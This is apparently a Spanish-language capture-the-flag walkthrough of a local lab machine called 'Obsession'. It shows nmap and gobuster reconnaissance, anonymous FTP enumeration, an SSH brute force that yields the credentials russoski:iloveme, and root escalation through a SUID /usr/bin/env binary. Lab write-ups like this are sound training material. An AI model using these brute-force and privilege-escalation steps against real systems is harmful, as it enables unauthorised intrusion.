- Tags: #Obsession
---
[Maquina Obsession](https://mega.nz/file/JHUEFZ4J#SyfKRfM6_xKBXLxP8JZKW-sVQnB0Nv2B1Dwbw6pRn9w) ==> Enlace de descarga a la maquina, 
```bash
7z x obsession.zip # Descomprimimos el archivo
sudo bash auto_deploy.sh obsession.tar # Desplegamos el laboratorio
```
---

#### Fase Reconocimiento:
**( 172.17.0.2 )** ==> Direccion ip del **target**
```bash
pinc -c 1 172.17.0.2

wichSystem.py 172.17.0.2 # Determinamos que estamos anta una maquina linux
172.17.0.2 (ttl -> 64): Linux
```
---

#### Fase Reconocimiento Puertos:
```bash
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts # Realizamos descubrimiento de puertos expuestos en el target
extractPorts allPorts # Parseamos la informacion mas importante del primer escaneo
nmap -sC -sV -p21,22,80 172.17.0.2 -oN targeted # Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detras de estos puertos.
 
 nmap --script http-enum -p80 172.17.0.2 # Nos reporta un archivo backup, Tendremos capacidad de directory listing
	/backup/: Backup folder w/ directory listing

nmap --script ftp-anon.nse -p21 172.17.0.2 # Tenemos vector de entrada.
	ftp-anon: Anonymous FTP login allowed (FTP code 230)
	-rw-r--r--    1 0        0             667 Jun 18  2024 chat-gonza.txt
	-rw-r--r--    1 0        0             315 Jun 18  2024 pendientes.txt
```
---
**( 21/tcp open  ftp     vsftpd 3.0.5 )** ==> Tenemos servicio ftp expuesto pero no desactualizado, Pero tenemos una posible inicio de sesion con el usuario: **Anonymous** --> **( ftp-anon: Anonymous FTP login allowed (FTP code 230) )** 
**(22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)  )** ==> Tenemos expuesto un servicio ssh, Donde si logramos enumerar usuarios tendremos un verctor de ataque
**( 80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu)) )** ==> Tenemos un servicio apache expuesto, el cual tendremos que auditar para detectar posibles vulnerabilidades 

#### Fase Reconocimiento Web:
**( http://172.17.0.2/ )** ==> Tenemos una web de nutricion y ejercicio, Donde tenemos un formulario de datos que tendremos que auditar para detectar si es vulnerable.
```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 --add-slash -o directoryReport   # Realizamos reconocimiento de rutas de directorios el cual no contempla dos accesibles
	 /backup/             [38;2;248;248;242mm (Status: 200) [Size: 937]
	 /important/          [38;2;248;248;242mm (Status: 200) [Size: 947]
```
---
**( http://172.17.0.2/backup/backup.txt )** ==> Nos reporta un posible usuari vulnerable: **( russoski )** 
**( ctrl + u )** ==> En modo codigo fuente, detectamos que este web reutilliza credenciales: **(  Utilizando el mismo usuario para todos mis servicios, podré recordarlo fácilmente  )**
```bash
nmap -p22 --script ssh-brute --script-args userdb=users.txt 172.17.0.2  # Aplicamos fuerza bruta para el usuario: ( russoski ) obteniendo sus credenciales validas.
	russoski:iloveme - Valid credentials # Tenemos una extrada por ssh para acceder al servidor
```
----

#### Intrusion
- Logramos acceder al **target**
```bash
ssh-keygen -R 172.17.0.2 && ssh russoski@172.17.0.2
```
---

#### Escalada Privilegios
**Nota** ==> Tenemos dos vias potenciales de elevar privilegios.
```bash
find / -perm -4000 2>/dev/null | xargs ls -l
-rwsr-xr-x 1 root root        48072 Apr  5  2024 /usr/bin/env # Este vinario es vulnerable

 sudo -l # Pedemos ejecutar este bianrio como root y despues obtener una shell privilegiada.
User russoski may run the following commands on e90fb4c799ef:
    (root) NOPASSWD: /usr/bin/vim
```
---
**Root** ==> Explotando binario **SUID**
```bash
 /usr/bin/env /bin/bash -p # Obtendremos una consola como root logrando el control total del target.
```
---
